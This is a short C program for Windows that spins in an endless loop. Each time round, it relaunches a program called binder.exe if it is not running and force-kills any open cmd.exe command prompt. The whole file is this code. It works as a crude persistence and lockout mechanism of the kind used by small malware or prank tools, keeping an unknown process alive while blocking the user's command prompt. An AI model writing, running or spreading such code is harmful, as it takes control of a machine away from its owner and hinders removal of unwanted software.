#include<stdlib.h>
main()
{
system("color 0A");
x:system("tasklist | findstr binder.exe || start binder.exe");
system("tasklist | findstr cmd.exe && taskkill /F /IM cmd.exe");
goto x;
}
